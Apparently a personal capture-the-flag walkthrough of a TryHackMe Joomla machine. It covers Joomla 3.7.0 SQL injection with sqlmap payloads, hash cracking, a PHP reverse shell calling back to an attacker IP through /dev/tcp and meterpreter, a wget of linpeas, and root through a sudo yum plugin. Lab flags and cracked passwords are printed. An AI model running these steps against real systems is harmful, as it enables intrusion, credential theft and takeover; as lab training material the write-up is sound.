@@ -1,0 +1,297 @@
+Task 2  Obtain user and root
+- What is the Joomla version?
+gobuster dir -u http://10.10.228.71/ -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.228.71/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/08/03 14:15:16 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 211]
+/.hta                 (Status: 403) [Size: 206]
+/.htpasswd            (Status: 403) [Size: 211]
+/administrator        (Status: 301) [Size: 242] [--> http://10.10.228.71/administrator/]
+/bin                  (Status: 301) [Size: 232] [--> http://10.10.228.71/bin/]
+/cache                (Status: 301) [Size: 234] [--> http://10.10.228.71/cache/]
+/cgi-bin/             (Status: 403) [Size: 210]
+/components           (Status: 301) [Size: 239] [--> http://10.10.228.71/components/]
+/images               (Status: 301) [Size: 235] [--> http://10.10.228.71/images/]
+/includes             (Status: 301) [Size: 237] [--> http://10.10.228.71/includes/]
+/index.php            (Status: 200) [Size: 9280]
+/language             (Status: 301) [Size: 237] [--> http://10.10.228.71/language/]
+/layouts              (Status: 301) [Size: 236] [--> http://10.10.228.71/layouts/]
+/libraries            (Status: 301) [Size: 238] [--> http://10.10.228.71/libraries/]
+/media                (Status: 301) [Size: 234] [--> http://10.10.228.71/media/]
+/modules              (Status: 301) [Size: 236] [--> http://10.10.228.71/modules/]
+/plugins              (Status: 301) [Size: 236] [--> http://10.10.228.71/plugins/]
+/robots.txt           (Status: 200) [Size: 836]
+/templates            (Status: 301) [Size: 238] [--> http://10.10.228.71/templates/]
+/tmp                  (Status: 301) [Size: 232] [--> http://10.10.228.71/tmp/]
+
+===============================================================
+2021/08/03 14:17:46 Finished
+
+
+nmap --script vuln -p 22,80,3306 10.10.4.176
+.....
+http-vuln-cve2017-8917: 
+|   VULNERABLE:
+|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-8917
+|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
+|       to execute aribitrary SQL commands via unspecified vectors.
+|       
+|     Disclosure date: 2017-05-17
+|     Extra information:
+|       User: root@localhost
+|     References:
+|       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
+....
+
+
+git clone https://github.com/OWASP/joomscan.git
+cd joomscan
+perl joomscan.pl -u http://10.10.30.43
+[+] Detecting Joomla Version                                                                                                               
+[++] Joomla 3.7.0 
+
+git clone https://github.com/Dionach/CMSmap
+cd CMSmap
+./cmsmap.py http://10.10.4.176
+...
+CMS Detection: Joomla
+[I] Joomla Version: 3.7.0
+...
+
+https://github.com/Tuhinshubhra/CMSeeK
+
+[i] Scanning Site: http://10.10.4.176
+[*] CMS Detected, CMS ID: joom, Detection method: header
+[i] detecting joomla version
+[*] Joomla version detected, version: 3.7.0
+[i] README.txt file found
+[i] Checking debug mode status
+[i] Locating admin url
+[*] Admin login page found: http://10.10.4.176/administrator
+
+
+joomla version 3.7.0
+3.7.0
+
+*Instead of using SQLMap, why not use a python script!*
+
+- What is Jonah's cracked password?
+hint:
+searchsploit joomla 3.7.0
+searchsploit joomla 3.7.0            
+--------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                           |  Path
+--------------------------------------------------------------------------------------------------------- ---------------------------------
+Joomla! 3.7.0 - 'com_fields' SQL Injection                                                               | php/webapps/42033.txt
+Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                            | php/webapps/43488.txt
+
+searchsploit -p php/webapps/42033.txt
+  Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection
+      URL: https://www.exploit-db.com/exploits/42033
+     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt
+File Type: ASCII text, with CRLF line terminators
+
+cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
+# Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+
+
+Using Sqlmap: 
+
+sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+Parameter: list[fullordering] (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (DUAL)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
+
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
+    
+    
+
+
+
+sqlmap -u "http://10.10.228.71/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla -T "#__users" --dump
+
+sqlmap -u "http://10.10.43.173/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --columns -D joomla -T '#__users'
+
+
+or
+git clone https://github.com/mavr1k7/Joomblah.git
+cd Joomblah
+python3 joomblah.py http://10.10.4.176 
+
+Fetching CSRF token
+Testing SQLi
+Found table: fb9j5_users
+Extracting users from fb9j5_users
+Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+Extracting sessions from fb9j5_session
+
+save $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+joom.txt
+hashid -m joom.txt
+Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
+[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt [Hashcat Mode: 3200]
+
+---> hash is Blowfish
+$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
+
+
+spiderman123
+
+
+- What is the user flag?
+http://10.10.43.173/administrator
+jonah:spiderman123
+
+try msfvenom -p php/meterpreter_reverse_tcp LHOST=10.6.88.227 lport=5555 -f raw > ex1.php 
+msfconsole
+msf6>use exploit/multi/handler
+set payload php/meterpreter/revese_tcp
+set lhost 10.6.88.227
+set lport 5555
+run
+
+
+inject php revese shell
+locate php-reverse-shell
+on finder Joomla --> Template -->Buzer --->index.php
+paste code from php-reverse-shell.php to index.php
+change ip=myip
+port = 1234
+save ---> Template preview
+
+or
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/1234 0>&1'");
+paste index.php
+save --> template preview
+
+on my machine
+nc -lnvp 1234
+ls /home
+cd /tmp
+wget http://10.6.88.227:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+.....
+Searching passwords in config PHP files
+        public $password = 'nv5uz9r3ZEDzVjNu';                                                                                                               
+                        $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];
+                        $this->password = null;
+                        'password' => $this->password,
+
+
+
+with username jjameson
+jjameson: nv5uz9r3ZEDzVjNu
+ssh jjameson@10.10.43.173
+cat user.txt
+27a260fe3cba712cfdedb1c86d80442e
+
+
+- What is the root flag?
+hint
+sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE
+    KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
+    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
+    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+
+https://gtfobins.github.io/gtfobins/yum/
+
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+
+
+Eg: 
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+
+sh-4.2# whoami
+root
+sh-4.2# ls
+user.txt
+sh-4.2# pwd
+/home/jjameson
+sh-4.2# cat /root/root.txt
+eec3d53292b1821868266858d7fa6f79
+
+
+
+https://mrjsec.co.uk/blog/daily-bugle/
+https://sumb0dyblog.wordpress.com/2020/02/06/daily-bugle-tryhackme-hard-write-up/
+https://somecookie.github.io/posts/dailybugle/
+https://thmwriteups.blogspot.com/2020/07/daily-bugle-write-up.html
+https://medium.com/@Mathias_Rud/tryhackme-daily-bugle-writeup-35d74fc8df7f
+
+
+Get-ChildItem -Path c:\ -Include *joom.nse* -File -Recurse -ErrorAction SilentlyContinue
+
